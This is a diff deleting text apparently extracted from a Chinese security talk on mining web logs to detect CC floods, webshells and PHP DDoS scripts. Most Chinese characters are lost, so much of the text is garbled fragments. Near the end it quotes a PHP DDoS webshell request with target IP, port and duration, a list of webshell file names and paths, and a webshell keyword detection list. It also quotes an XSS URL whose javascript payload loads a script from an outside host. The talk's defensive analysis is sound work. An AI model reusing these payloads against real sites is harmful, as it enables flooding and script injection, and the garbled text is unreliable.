@@ -1,378 +1,0 @@
-
-360 
-
-About Me
- (Vin Dong)
- 03Web() 80sec(www.80sec.com) WebWebIDS/IPS &&SDL  (www.rizhibao.com)  360wangzhan.360.cn http://weibo.com/vindong
-
-1360
-2 3 4DDoS 5 6 7
-
-
-
- 
-
-
-
-2013-08-27
-16.85 TB TB
-
-2014-09-14
-72.72
-
-
-
-2013-08-27
-81.24 GB GB
-
-2014-09-14
-208.6
-
-
-
-2013-08-27
-3,100,000,000 Request
-
-2014-09-14
-4,825,117,915 Request
-
-2013-08-27
-13,223,130 Uip
-
-
-2014-09-14
-37,510,291 Uip
-
-
-
-2013-08-27
-300,000 Web Vul Attack
-
-2014-09-14
-2,168,241 Web Vul Attack
-
-
-
-2013-08-27
-68,000,000
-CC Attack
-
-2014-09-14
-315,572,938 CC Attack
-
-
-
-Scribe+Storm+Redis+Mysql+Hadoop
-......
-
- 
-
-
-
-4V: Volume,Variety,Velocity,Value
-
-HadoopSparkStorm...
-
-...
-
-
-
- 1(time),(uri),(sourceip),(path),(user-agent), (bytes)(bot) 2(time)(path)(sourceip) (vulnerability/webshell)(attack)(status 200/404/403/500) 3(vulnerability)(scan uri)(status 200/404/403/500 )    
-
-
-
-
-
-
-
-
-
-
-/
-
-
-
-/
-
-   DEDECMS 
-
- 
-
-
-
- 
-
-WhoWhenHow
-
- 
-
-
-
-
-
-
-
-
-
-     /
-
-
-
-
-
-
-
-
-
-/
-
-/admin/
-
-Index.php
-
-/
-
-
-
-/index.php
-
-/bbs.php
-
-/swfupload.js
-
-2885/
-
-/////
-
-
-
-
-
-access.logCC 5KeyIP+URL
-
-1 Session=5
-
-1.1.1.1 1.1.1.1 2.2.2.2 2.2.2.2 3.3.3.3
-
-/a.php /a.php /b.php /b.php /a.php
-
-IP+URL=K/V
-
-1.1.1.1
-
-a.php
-
-2
-
-2.2.2.2
-
-b.php
-
-2
-
-3.3.3.3
-
-a.php
-
-1
-
-355
-
-552CC
-
-
-
-
-
-CC
-
-1.1.1.1
-
-a.php
-
-2
-
-2.2.2.2
-
-b.php
-
-2
-
-3.3.3.3
-
-a.php
-
-1
-
-5CC(52)
-
-Key(IP+URL)5CC
-
-1.1.1.1 a.php 2 2.2.2.2 b.php 2 3.3.3.3 a.php 1
-
-2/5
-
-40%
-
-2/5
-
-40%
-
-1/5
-
-20%
-
-40%
-
-1.1.1.12.2.2.2a.phpb.phpCC "IPURL"CCUA
-
- 
-
-
- systemexecphpinfophpspypowered byunion select... CSSbgcolorjs  ABCB 80C20 
-
-Windows
-
-
-
-
-Windows  PHP PHP PHP PHP 
-
-Windows
-
-
-
-NTFSweb http://www.80sec.com/release/ntfs-web-security.txt
-
-
-
-
-
-360
- 1/ 2 3 4 5() 6
-
-
-360
-
-
-1/ 2URLCSS,JS,HTML, 3URLM1M2  4M1-T,M2-TM1-Y,M2-Y 5
-
-
-
-360
-
-
-
-
-0
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
- 
-
-
-
-
-2011
-
- DDoS
-
-PHPDDoS
-
-
-
-PHPDDoS
-
-
-
-300W+PHPDDoS
-
-
- DDoS 65535A=65535 bytes 4000=round((65535/1024/1024) * 4000,2)=249.99 MB /templets/syn.php/ip=162.211.183.152&port=80&time=4000 162.211.183.15280250M 300W
-
-
-
-
-
-
-
-
-
-
- 2014-09-14DDoS896 3473DDoS 298DDoS 720
-
-
-
-
-DDoS
-abc.php xi.php Xml.php dedetag.claess.php counti.php plase.php cba.php os.php practical.php abbb.php
-
-
-/plus/ /templets/ /include/ /data/ /api/ /cache/ /admin/ /UploadFiles/ /
-
-
-80 53 21 22
-
-
-QQ1045158267.php
-
-
-/page/album_view/prof_id/3550373/categlla/ 4.om/templets/img/deins_asy.php
-
-
- PHPwebshellDDoS    ...
-
-
-
- 
-
-
-
-
-
-
-
-
-
-http://qt.qq.com/safecheck.html?page=http://www.hnzazhi.com/contents/44/84.html &ref=&wid=2414&uid=203586&url=javascript:var a=document.createElement("script");a.type="text/javascript";a.src="http://www.qqfan gke.com/js/skin/jquery1.10.2.min.js";document.getElementsByTagName("HEAD").item(0).appendChild(a);
-
-
-
-
-
- 
-
-
-360Web
-http://wangzhan.360.cn/xingtu
-
-
-360Web
-
-1Cron 2W3CNCSA() 3(200php) 4 5 61G200 7360 8Web 9WebCC
-
-
-360-Web
-
- 7
-
-
- Dongfang-s@360.cn imvindong http://weibo.com/vindong/
-
-
-
-
